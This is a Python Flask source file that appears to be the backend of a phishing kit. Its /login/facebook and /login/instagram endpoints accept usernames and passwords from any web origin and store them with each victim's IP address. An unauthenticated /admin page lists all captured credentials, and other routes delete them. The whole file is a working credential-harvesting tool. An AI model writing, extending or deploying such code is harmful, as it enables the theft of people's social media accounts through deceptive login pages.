from flask import Flask, redirect, render_template, request, url_for
from flask_cors import CORS
import models


user_db = models.UserDatabase()

app = Flask(__name__)
CORS(app, resources={r"/login/*": {"origins": "*"}})

@app.route('/login/facebook', methods=['POST'])
def facebook_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        ip_address = request.remote_addr
        
        user_db.insert_user(username, password, ip_address, 'Facebook')
        
        return "",200

@app.route('/login/instagram', methods=['POST'])
def instagram_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        ip_address = request.remote_addr
        
        user_db.insert_user(username, password, ip_address, 'Instagram') 
        
        return "",200

@app.route('/admin')
def admin():
    users = user_db.get_all_users()
    return render_template('admin.html', users=users)

@app.route('/delete/<int:user_id>', methods=['POST'])
def delete(user_id):
    user_db.delete_user(user_id)
    return redirect(url_for('admin'))

@app.route('/delete_all', methods=['POST'])
def delete_all():
    user_db.delete_all_users()
    return redirect(url_for('admin'))

if __name__ == '__main__':
    app.run(debug=True)
